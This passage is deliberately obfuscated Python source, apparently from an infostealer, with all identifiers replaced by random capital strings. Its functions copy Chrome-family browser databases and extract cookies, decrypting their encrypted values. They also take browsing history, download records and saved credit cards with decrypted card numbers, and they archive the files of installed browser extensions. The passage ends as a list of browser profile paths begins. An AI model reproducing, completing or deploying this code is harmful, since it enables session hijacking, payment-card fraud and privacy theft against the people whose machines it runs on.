            DVADARITRESRSAFEZWTBZMTDUMQPYHBSMZTWMKJFYESYSQMOYAPMJDUPLBLPGDARMNKIDX.append(f"{ABQNEMBXOJQBDMCJJPCJLPGKMDNKMHUNWVGQIHIFCINEQOOHEKOGKPTRIGPWAWCGHTPJJTYOXYJBJPKLP}\n{FXQSQMHNRJKEYZSRNTGJPIVIOOMUYXRNRFOCIDVMUNSWIRNVAYMU}\n{ELXMSTZLSCGFFKIKGJTXDNUEFKYLUCUBOMTSSTFNMWHRZJIVLMCUFZM}\n{DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name}\n")
            OGVKTRAIFGXTEJZUPVHRAVLITJSFFAITNLKNEBZNZIQDAEYRHOMZVZPJYEGLVGSGAHJRZUULCPRVRJX += 1

        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.close()

    def IYBCPHJVXYITZWHJMJRROIKNBTQRCDJSJSFBKVZDLJILLUTHOYNKOXBLAUK(DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP):
        global ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH
        ASLKHHYZLSZBKEZAXUITTEQJBCLPWPWXWNZFXQUNOWFJDVIJGFVLNMVMFTTGRHOFONQZDBPLRUKMVTZMISROIBSZKNHDPTHG = os.path.join(RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, 'Network', 'Cookies')
        if not os.path.exists(ASLKHHYZLSZBKEZAXUITTEQJBCLPWPWXWNZFXQUNOWFJDVIJGFVLNMVMFTTGRHOFONQZDBPLRUKMVTZMISROIBSZKNHDPTHG):
            return

        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB = sqlite3.connect(":memory:")
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ = sqlite3.connect(ASLKHHYZLSZBKEZAXUITTEQJBCLPWPWXWNZFXQUNOWFJDVIJGFVLNMVMFTTGRHOFONQZDBPLRUKMVTZMISROIBSZKNHDPTHG)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.backup(MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.close()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC = MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.cursor()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            ABQNEMBXOJQBDMCJJPCJLPGKMDNKMHUNWVGQIHIFCINEQOOHEKOGKPTRIGPWAWCGHTPJJTYOXYJBJPKLP =          f"- Url     : {v4r_row[0]}"
            KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN =         f"  Name    : {v4r_row[1]}"
            GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT =         f"  Path    : {v4r_row[2]}"
            NCSTHSHZWAUECTQNYBAYQAFABBQJZCAKTATEVQKEZUKQALYYYVHDBVYIHXDOJTAPCVOTRKEFJONYACYMNEHNGFVGWH =       f"  Cookie  : {QKTXEAWGAXPPTBAWOOZDPBFTUIEPUNYOSDAGDRMRSGZJEIOJKLBWFIVKRUDRDIMUDGXKDIPNDYPBXPFQBB(v4r_row[3], HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP)}"
            YTDRWUDQGNQIPGQUJMZCBIDYENROKOKMVDCESRJKZOUJMSJLUEJTIWVXZKCYX =       f"  Expire  : {v4r_row[4]}"
            DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name = f"  Browser : {DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP}"
            RWIIRTTVDRVQTMOWWALHGGZQJGCBWQPHMYQNBHSFQYOHEOKICGAREQRBYDQN.append(f"{ABQNEMBXOJQBDMCJJPCJLPGKMDNKMHUNWVGQIHIFCINEQOOHEKOGKPTRIGPWAWCGHTPJJTYOXYJBJPKLP}\n{KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN}\n{GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT}\n{NCSTHSHZWAUECTQNYBAYQAFABBQJZCAKTATEVQKEZUKQALYYYVHDBVYIHXDOJTAPCVOTRKEFJONYACYMNEHNGFVGWH}\n{YTDRWUDQGNQIPGQUJMZCBIDYENROKOKMVDCESRJKZOUJMSJLUEJTIWVXZKCYX}\n{DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name}\n")
            ZICSJPWHZPWHHOQBVOFOJOUWSTQDJWUBOCUIQRXCLVSAVEATRJULMPKOGVCOKZEPYDQYSH += 1

        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.close()

    def TDDXRQLBZTBVHRRRPVALRKTFOSJCHSHFQOUTZCHBXXHHPZVEGPZOZNWTSZVQBMEHWUPYUNCALTJQNZJCBRWESSOTNP(DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK):
        global NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ
        STAKMVPZPBMXOVXBSEONDZHZMBLJNCNQWBIBGOPNLOSSRZEPYRVOAZRTHVMGUSOHHHEPNIALMTUF = os.path.join(RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, 'History')
        if not os.path.exists(STAKMVPZPBMXOVXBSEONDZHZMBLJNCNQWBIBGOPNLOSSRZEPYRVOAZRTHVMGUSOHHHEPNIALMTUF):
            return
        
        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB = sqlite3.connect(":memory:")
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ = sqlite3.connect(STAKMVPZPBMXOVXBSEONDZHZMBLJNCNQWBIBGOPNLOSSRZEPYRVOAZRTHVMGUSOHHHEPNIALMTUF)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.backup(MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.close()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC = MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.cursor()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            ABQNEMBXOJQBDMCJJPCJLPGKMDNKMHUNWVGQIHIFCINEQOOHEKOGKPTRIGPWAWCGHTPJJTYOXYJBJPKLP =          f"- Url     : {v4r_row[0]}"
            JLDLEFAMHMVLIHYXEBPNAHFCGVGOIRBNBZITTNBDUDPZDZESTUCYHRJDQAAYWGMIHMERJBMULYZXHURVYXDK =        f"  Title   : {v4r_row[1]}"
            LXURZVCBOUOZHBOAHBBEEJHIUXJFWQEDKMCYGIRTVOZKVHVLPSFCBDYUSJLPEVLBYHCOBFUFFYBAKMUKIWDMCUOEGOBEVXE =         f"  Time    : {v4r_row[2]}"
            DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name = f"  Browser : {DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP}"
            OCKKXFBVEKTEHMMTEZCOOMRCZJUCHQJBLFUKAYKOLGMQGWUVBFIZYSOTNFGXWLMUSYECYNLSM.append(f"{ABQNEMBXOJQBDMCJJPCJLPGKMDNKMHUNWVGQIHIFCINEQOOHEKOGKPTRIGPWAWCGHTPJJTYOXYJBJPKLP}\n{JLDLEFAMHMVLIHYXEBPNAHFCGVGOIRBNBZITTNBDUDPZDZESTUCYHRJDQAAYWGMIHMERJBMULYZXHURVYXDK}\n{LXURZVCBOUOZHBOAHBBEEJHIUXJFWQEDKMCYGIRTVOZKVHVLPSFCBDYUSJLPEVLBYHCOBFUFFYBAKMUKIWDMCUOEGOBEVXE}\n{DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name}\n")
            NFCRVULHVDRDMVZBSZALRFJAWVFAPGOIKJYAGHFPICCPMARXZDWRERSCOKZHLGBZJJEOQZFAAAAGAJIAGVKQ += 1

        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.close()
    
    def PMFLJSEJEQTXLZEKIJTZCIYWPBOKUFWCYSIERPATFOJDFNAYYUMRACBJJLTXUAUNUXENRVKYEBZQGYMETACOQCEOHOAKX(DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK):
        global BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA
        YBFVLMCBLLLYJEOUNSHGHOWXHKXKDVCCQGUFQJESYKBFTXTXXACFNVZWOSSFWE = os.path.join(RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, 'History')
        if not os.path.exists(YBFVLMCBLLLYJEOUNSHGHOWXHKXKDVCCQGUFQJESYKBFTXTXXACFNVZWOSSFWE):
            return

        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB = sqlite3.connect(":memory:")
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ = sqlite3.connect(YBFVLMCBLLLYJEOUNSHGHOWXHKXKDVCCQGUFQJESYKBFTXTXXACFNVZWOSSFWE)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.backup(MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.close()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC = MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.cursor()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.execute('SELECT tab_url, target_path FROM downloads')
        for row in AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.fetchall():
            if not row[0] or not row[1]:
                continue
            GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT =         f"- Path    : {row[1]}"
            ABQNEMBXOJQBDMCJJPCJLPGKMDNKMHUNWVGQIHIFCINEQOOHEKOGKPTRIGPWAWCGHTPJJTYOXYJBJPKLP =          f"  Url     : {row[0]}"
            DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name = f"  Browser : {DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP}"
            HSBCVEGPPCYGWMTVVMAFDRLGMCYRNMEODSODLNERJMYCEMNPIUEXSYWXATA.append(f"{GCVHDLADYPZJJIKPEHUSHKDCMYXCDNXZAPJSDNVEDBTNKLMNWLNGNWT}\n{ABQNEMBXOJQBDMCJJPCJLPGKMDNKMHUNWVGQIHIFCINEQOOHEKOGKPTRIGPWAWCGHTPJJTYOXYJBJPKLP}\n{DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name}\n")
            BFQRRXGIGYNDAUZGETTVDOXGINBGXTGYHQEFCQXVNKLLVYMXKILA += 1

        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.close()
    
    def GTAVLMKYSNCYOYFUSPKXFFQFGTFKVYBGEZXPHWYYLHHOQOYVTEIMSLRZFRCMMGOBBUHJPJVDSGUCCMALKGFHJNA(DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP):
        global CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE
        PRLNNPXISIUWIYVIALITBKKZUTIFGAFNBWWVTTWYPAFLXZOAMZILJJGECFYDPAMZGOAON = os.path.join(RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, 'Web Data')
        if not os.path.exists(PRLNNPXISIUWIYVIALITBKKZUTIFGAFNBWWVTTWYPAFLXZOAMZILJJGECFYDPAMZGOAON):
            return

        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB = sqlite3.connect(":memory:")
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ = sqlite3.connect(PRLNNPXISIUWIYVIALITBKKZUTIFGAFNBWWVTTWYPAFLXZOAMZILJJGECFYDPAMZGOAON)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.backup(MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB)
        OUXMABQWMDTJBLFNONCJYWGUHPBZTGBUOECUUIYOTXRAZZVGNDIVJPXPJKFUNGQ.close()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC = MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.cursor()
        AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in AYMUHWOGXSIRHFWHKQZCOBPTKMLMVKBZMZGWUKEQRJNQQPJVLWZDGRXGGKLAWTWQUKOAXRWNENQQEWTDFFAFFQWCBC.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN =             f"- Name             : {v4r_row[0]}"
            AJBJBEQFEXGPRYCCDSPZPYDTCKDFZBDXQHTCXWVFHKEQKVLKCNFBM = f"  Expiration Month : {v4r_row[1]}"
            ZQINIPMPZXIEJCISALYYTUFPVZZUWAPDUYZRKEXPQRQVMKIBYWGABZQHFXBZPAXFBGOUMYFSQSPIEKAFM =  f"  Expiration Year  : {v4r_row[2]}"
            JHOFVBZBYGBCGHKXMSQIBWAPEXUPICXUXKZGOEEUTRDDRHWLGELYMOKMNSEBRPDKEQSGRZCKTTIBPKLCOZRUFCYFKPSGCUZKBFT =      f"  Card Number      : {QKTXEAWGAXPPTBAWOOZDPBFTUIEPUNYOSDAGDRMRSGZJEIOJKLBWFIVKRUDRDIMUDGXKDIPNDYPBXPFQBB(v4r_row[3], HJRPSRJMNQXFKXGCFHCIQSNLVKPTLARUVOSRCSUCGCVLMHTVGDEQJLURATZMBSLJOZZEGJNLSCDLICETLBHP)}"
            VSVVEEPOQYUZKXKZYMSOLWSXHYKSPCOZSTWPQMACVSSIYNQAHCPZOBPFNVXVEPXCCVVPONNSC =    f"  Date Modified    : {v4r_row[4]}"
            DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name =     f"  Browser          : {DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP}"
            HZGVWZFFSBDTAPBNOYKTDOHQALCSPMYEREAJBMCZMRSVANMGITAVEKTKGAVQWTALMJEXSGRCKSPVGDGWGOLILEWS.append(f"{KZGICMGSFBVWUUYBTGBQSUIIQMEFPNJULMYQNRPMWEQDWMYKRYIXN}\n{AJBJBEQFEXGPRYCCDSPZPYDTCKDFZBDXQHTCXWVFHKEQKVLKCNFBM}\n{ZQINIPMPZXIEJCISALYYTUFPVZZUWAPDUYZRKEXPQRQVMKIBYWGABZQHFXBZPAXFBGOUMYFSQSPIEKAFM}\n{JHOFVBZBYGBCGHKXMSQIBWAPEXUPICXUXKZGOEEUTRDDRHWLGELYMOKMNSEBRPDKEQSGRZCKTTIBPKLCOZRUFCYFKPSGCUZKBFT}\n{VSVVEEPOQYUZKXKZYMSOLWSXHYKSPCOZSTWPQMACVSSIYNQAHCPZOBPFNVXVEPXCCVVPONNSC}\n{DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_name}\n")
            CJWEDMDLRRUFMYVQTUDSWFWIJNQZLTICBCLRDPGHYPNLGRDYFZBGWZQUJAKJWEFMELQHQSRYJLULQJVAMNMUIWIGTMLODRVOE += 1
        
        MAFFFZDRRIMHVHVLAWVTENXUIBFZHZPAJFCMFEFCDLMWUNWIVMB.close()

    def LYHNJZGPRKWWZEZIKXQMXZXVCAREEHFUJGECNQGFASOCXCTTGDWEMLPGICLTLAHXRORPMXQDJMYEL(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG, JRMPEAXXCLCZSYEPITEDBXGAWFBYVTFRHNTSFKLGOHXLQLKPOFGOTIGOROVGTTULRDDGWSFWSUYHHIWNQZPYYMDNXAPJGHE, DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP, RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK):
        global FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM
        BUUUCHPIMFTCFRAJOZKSOTNGSPEHPRWWMLPKDQRLSKASCWKWGKNJQQOEPKYQZUJPHMJSZNRUFQBOEGKB = os.path.join(RJSCDXHBEJQQGESJTGRFSZPYXECQRBJAXRBZNFYGIZYIXTXIAGUHOPONSYCEBGXPGGBOHBGGCKEK, 'Extensions')
        KBKHVPTUGQJRCNFZXJVYKGOKSDYYTZHCUJMAOOGQXJBIUNQMEQIKRYAQNHKQQGRRVXIMJLMIIYHEGYFBDSXSDZ = os.path.join("Extensions", DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP)

        if not os.path.exists(BUUUCHPIMFTCFRAJOZKSOTNGSPEHPRWWMLPKDQRLSKASCWKWGKNJQQOEPKYQZUJPHMJSZNRUFQBOEGKB):
            return 

        JZQAZLLAYAAYXXAJVCKXRMXWMHLHCEOCNRKFWFHIECEPTSSTDOETJYZLKIPTSNFLOAAIPZLKDSIVLGGYPK = [v4r_item for v4r_item in os.listdir(BUUUCHPIMFTCFRAJOZKSOTNGSPEHPRWWMLPKDQRLSKASCWKWGKNJQQOEPKYQZUJPHMJSZNRUFQBOEGKB) if os.path.isdir(os.path.join(BUUUCHPIMFTCFRAJOZKSOTNGSPEHPRWWMLPKDQRLSKASCWKWGKNJQQOEPKYQZUJPHMJSZNRUFQBOEGKB, v4r_item))]
        
        for v4r_extention in JZQAZLLAYAAYXXAJVCKXRMXWMHLHCEOCNRKFWFHIECEPTSSTDOETJYZLKIPTSNFLOAAIPZLKDSIVLGGYPK:
            if "Temp" in v4r_extention:
                continue
            
            FVHCPUFMTZFGAXDBGLHUMSSRVYSNMZXJCYJNDKUCZJPMUHQAHPGBIFALPEXLKFTTGXEOVPBKQMM += 1
            PYGZGZYIPEATIKRPBINOWGZIBSNCCIGUHWNFHXMXKILXOJPOSACBZFGJMQCKP = False
            
            for v4r_extension_name, v4r_extension_folder in JRMPEAXXCLCZSYEPITEDBXGAWFBYVTFRHNTSFKLGOHXLQLKPOFGOTIGOROVGTTULRDDGWSFWSUYHHIWNQZPYYMDNXAPJGHE:
                if v4r_extention == v4r_extension_folder:
                    PYGZGZYIPEATIKRPBINOWGZIBSNCCIGUHWNFHXMXKILXOJPOSACBZFGJMQCKP = True
                    
                    FZOBRQEUBTPAKRKONPWFIPIFJMXINBHSQPZWWEXFNHRVQXPPOMEEEAINXMVKNAEGXWNRYTRWWSNWDA = os.path.join(KBKHVPTUGQJRCNFZXJVYKGOKSDYYTZHCUJMAOOGQXJBIUNQMEQIKRYAQNHKQQGRRVXIMJLMIIYHEGYFBDSXSDZ, v4r_extension_name, v4r_extention)
                    
                    OCNBHTVBKHNPYFINXFTLHVXONVQSPOSBDTLOYFYSUHJXZBHZXOXBWLYTY = os.path.join(BUUUCHPIMFTCFRAJOZKSOTNGSPEHPRWWMLPKDQRLSKASCWKWGKNJQQOEPKYQZUJPHMJSZNRUFQBOEGKB, v4r_extention)
                    for v4r_item in os.listdir(OCNBHTVBKHNPYFINXFTLHVXONVQSPOSBDTLOYFYSUHJXZBHZXOXBWLYTY):
                        BIHDPBZQKVAKFZACOXJQTISEFKEQKMYEHMIETVRVVNQERYDCHYLKVXPTXTVWICWWUEYGOLTOKIHCIRXQCNMIOCSAVBLNQKYCXT = os.path.join(OCNBHTVBKHNPYFINXFTLHVXONVQSPOSBDTLOYFYSUHJXZBHZXOXBWLYTY, v4r_item)
                        
                        if os.path.isdir(BIHDPBZQKVAKFZACOXJQTISEFKEQKMYEHMIETVRVVNQERYDCHYLKVXPTXTVWICWWUEYGOLTOKIHCIRXQCNMIOCSAVBLNQKYCXT):
                            for dirpath, dirnames, filenames in os.walk(BIHDPBZQKVAKFZACOXJQTISEFKEQKMYEHMIETVRVVNQERYDCHYLKVXPTXTVWICWWUEYGOLTOKIHCIRXQCNMIOCSAVBLNQKYCXT):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, OCNBHTVBKHNPYFINXFTLHVXONVQSPOSBDTLOYFYSUHJXZBHZXOXBWLYTY)
                                    SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.write(file_path, os.path.join(FZOBRQEUBTPAKRKONPWFIPIFJMXINBHSQPZWWEXFNHRVQXPPOMEEEAINXMVKNAEGXWNRYTRWWSNWDA, arcname))
                        else:
                            SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.write(BIHDPBZQKVAKFZACOXJQTISEFKEQKMYEHMIETVRVVNQERYDCHYLKVXPTXTVWICWWUEYGOLTOKIHCIRXQCNMIOCSAVBLNQKYCXT, os.path.join(FZOBRQEUBTPAKRKONPWFIPIFJMXINBHSQPZWWEXFNHRVQXPPOMEEEAINXMVKNAEGXWNRYTRWWSNWDA, v4r_item))
                    break

            if not PYGZGZYIPEATIKRPBINOWGZIBSNCCIGUHWNFHXMXKILXOJPOSACBZFGJMQCKP:
                OKTUKMRFETQIEXNMKOTVMBFIQLFCVLVVVXDIADADDGTYKULGDDZTDQDHOMMIVFMWPMOEJFGNXHKZZOHPTFYJVEABPPHNHQAE = os.path.join(KBKHVPTUGQJRCNFZXJVYKGOKSDYYTZHCUJMAOOGQXJBIUNQMEQIKRYAQNHKQQGRRVXIMJLMIIYHEGYFBDSXSDZ, "Unknown Extension", v4r_extention)
                
                OCNBHTVBKHNPYFINXFTLHVXONVQSPOSBDTLOYFYSUHJXZBHZXOXBWLYTY = os.path.join(BUUUCHPIMFTCFRAJOZKSOTNGSPEHPRWWMLPKDQRLSKASCWKWGKNJQQOEPKYQZUJPHMJSZNRUFQBOEGKB, v4r_extention)
                for v4r_item in os.listdir(OCNBHTVBKHNPYFINXFTLHVXONVQSPOSBDTLOYFYSUHJXZBHZXOXBWLYTY):
                    BIHDPBZQKVAKFZACOXJQTISEFKEQKMYEHMIETVRVVNQERYDCHYLKVXPTXTVWICWWUEYGOLTOKIHCIRXQCNMIOCSAVBLNQKYCXT = os.path.join(OCNBHTVBKHNPYFINXFTLHVXONVQSPOSBDTLOYFYSUHJXZBHZXOXBWLYTY, v4r_item)
                    
                    if os.path.isdir(BIHDPBZQKVAKFZACOXJQTISEFKEQKMYEHMIETVRVVNQERYDCHYLKVXPTXTVWICWWUEYGOLTOKIHCIRXQCNMIOCSAVBLNQKYCXT):
                        for dirpath, dirnames, filenames in os.walk(BIHDPBZQKVAKFZACOXJQTISEFKEQKMYEHMIETVRVVNQERYDCHYLKVXPTXTVWICWWUEYGOLTOKIHCIRXQCNMIOCSAVBLNQKYCXT):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, OCNBHTVBKHNPYFINXFTLHVXONVQSPOSBDTLOYFYSUHJXZBHZXOXBWLYTY)
                                SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.write(file_path, os.path.join(OKTUKMRFETQIEXNMKOTVMBFIQLFCVLVVVXDIADADDGTYKULGDDZTDQDHOMMIVFMWPMOEJFGNXHKZZOHPTFYJVEABPPHNHQAE, arcname))
                    else:
                        SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG.write(BIHDPBZQKVAKFZACOXJQTISEFKEQKMYEHMIETVRVVNQERYDCHYLKVXPTXTVWICWWUEYGOLTOKIHCIRXQCNMIOCSAVBLNQKYCXT, os.path.join(OKTUKMRFETQIEXNMKOTVMBFIQLFCVLVVVXDIADADDGTYKULGDDZTDQDHOMMIVFMWPMOEJFGNXHKZZOHPTFYJVEABPPHNHQAE, v4r_item))

    DGWWIBYPFAKFJUBURTWUNVGIBGDSPBECHRBAXLLWBSMPMDNMVWPP_files = [
        ("Google Chrome",          os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(UJVPFPWWURNJYAHFBVOWSRHJMIUMBXKFVNUYMLYUTMUBUEWYEZ,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
